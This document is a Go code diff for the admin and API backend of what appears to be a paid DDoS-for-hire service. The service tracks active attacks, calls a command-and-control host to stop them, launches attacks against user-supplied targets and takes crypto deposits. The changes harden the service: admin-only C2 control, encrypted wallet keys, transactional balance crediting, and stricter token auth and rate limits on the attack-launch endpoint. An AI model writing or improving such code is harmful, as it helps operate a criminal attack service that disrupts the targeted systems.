@@ -1638,17 +1638,26 @@ func apiStopAll(w http.ResponseWriter, r *http.Request) {
 	}
 	stopped := 0
 	mu.Lock()
-	for id, atk := range activeAttacks {
-		if atk.UserID == username {
+	if username == "admin" {
+		for id := range activeAttacks {
 			delete(activeAttacks, id)
 			stopped++
 		}
+	} else {
+		for id, atk := range activeAttacks {
+			if atk.UserID == username {
+				delete(activeAttacks, id)
+				stopped++
+			}
+		}
 	}
 	mu.Unlock()
-	go func() {
-		client := &http.Client{Timeout: 10 * time.Second}
-		_, _ = client.Get(fmt.Sprintf("%s/c2/admin/stop_all?token=%s", cfg.C2Host, cfg.C2Key))
-	}()
+	if username == "admin" {
+		go func() {
+			client := &http.Client{Timeout: 10 * time.Second}
+			_, _ = client.Get(fmt.Sprintf("%s/c2/admin/stop_all?token=%s", cfg.C2Host, cfg.C2Key))
+		}()
+	}
 	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "stopped": stopped})
 }
 
@@ -1841,7 +1850,12 @@ func handleAddWallet(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	address := Sanitize(r.FormValue("address"))
-	db.Exec("INSERT INTO wallets(address, private_key, status, assigned_to) VALUES (?, ?, 'Free', '')", address, r.FormValue("private_key"))
+	privateKey, err := encryptWalletPrivateKey(r.FormValue("private_key"))
+	if err != nil {
+		http.Error(w, "Wallet encryption unavailable", http.StatusInternalServerError)
+		return
+	}
+	db.Exec("INSERT INTO wallets(address, private_key, status, assigned_to) VALUES (?, ?, 'Free', '')", address, privateKey)
 	LogActivity(r, ActivityLogEntry{
 		ActorType: actorTypeAdmin,
 		Username:  username,
@@ -1999,13 +2013,37 @@ func handleDepositAction(w http.ResponseWriter, r *http.Request) {
 	}
 	id := r.FormValue("id")
 	action := r.FormValue("action")
+	tx, err := db.Begin()
+	if err != nil {
+		http.Error(w, "Database Error", http.StatusInternalServerError)
+		return
+	}
+	defer func() {
+		_ = tx.Rollback()
+	}()
 	if action == "confirm" {
 		var user string
 		var usd float64
-		db.QueryRow("SELECT user_id, usd_amount FROM deposits WHERE id=?", id).Scan(&user, &usd)
-		db.Exec("UPDATE deposits SET status='Paid', confirmed_at=? WHERE id=?", time.Now().Format("2006-01-02 15:04"), id)
-		db.Exec("UPDATE users SET balance=balance+? WHERE username=?", usd, user)
-		db.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to=?", id)
+		if err := tx.QueryRow("SELECT user_id, usd_amount FROM deposits WHERE id=?", id).Scan(&user, &usd); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
+		if _, err := tx.Exec("UPDATE deposits SET status='Paid', confirmed_at=? WHERE id=?", time.Now().Format("2006-01-02 15:04"), id); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
+		if _, err := tx.Exec("UPDATE users SET balance=balance+? WHERE username=?", usd, user); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
+		if _, err := tx.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to=?", id); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
+		if err := tx.Commit(); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
 		LogActivity(r, ActivityLogEntry{
 			ActorType: actorTypeAdmin,
 			Username:  u,
@@ -2021,8 +2059,18 @@ func handleDepositAction(w http.ResponseWriter, r *http.Request) {
 			},
 		})
 	} else {
-		db.Exec("UPDATE deposits SET status='Rejected' WHERE id=?", id)
-		db.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to=?", id)
+		if _, err := tx.Exec("UPDATE deposits SET status='Rejected' WHERE id=?", id); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
+		if _, err := tx.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to=?", id); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
+		if err := tx.Commit(); err != nil {
+			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
+			return
+		}
 		LogActivity(r, ActivityLogEntry{
 			ActorType: actorTypeAdmin,
 			Username:  u,
@@ -2158,13 +2206,21 @@ func apiLaunch(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 	w.Header().Set("Cache-Control", "no-store")
 
-	// Prefer Authorization: Bearer <token>. Keep ?token=... temporarily.
+	if r.Method != http.MethodPost {
+		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
+		return
+	}
+	if isRateLimited(getIP(r)) {
+		writeJSONError(w, http.StatusTooManyRequests, "rate_limited", "Too many requests.")
+		return
+	}
 	tok := ""
 	if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
 		tok = strings.TrimSpace(strings.TrimPrefix(ah, "Bearer "))
 	}
 	if tok == "" {
-		tok = r.URL.Query().Get("token")
+		writeJSONError(w, http.StatusUnauthorized, "missing_token", "Authorization required.")
+		return
 	}
 
 	usr, ok := getUserByToken(tok)
@@ -2172,7 +2228,34 @@ func apiLaunch(w http.ResponseWriter, r *http.Request) {
 		writeJSONError(w, http.StatusForbidden, "bad_token", "Invalid token.")
 		return
 	}
-	target := Sanitize(r.URL.Query().Get("target"))
+	if strings.TrimSpace(usr.Status) != "Active" {
+		writeJSONError(w, http.StatusForbidden, "inactive_user", "User is inactive.")
+		return
+	}
+	planName := effectivePlanName(usr.Plan)
+	limits := getPlanConfig(planName)
+	if !limits.API {
+		writeJSONError(w, http.StatusForbidden, "api_not_allowed", "API access is not enabled for this plan.")
+		return
+	}
+	if r.ContentLength > maxBodySize {
+		writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
+		return
+	}
+	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
+	if err := r.ParseForm(); err != nil {
+		if isRequestBodyTooLarge(err) {
+			writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
+			return
+		}
+		writeJSONError(w, http.StatusBadRequest, "bad_request", "Invalid request payload.")
+		return
+	}
+	target := Sanitize(r.FormValue("target"))
+	if target == "" {
+		writeJSONError(w, http.StatusBadRequest, "missing_target", "Target is required.")
+		return
+	}
 	if isBlacklisted(target) {
 		writeJSONError(w, http.StatusForbidden, "target_blacklisted", "Target is blacklisted.")
 		return
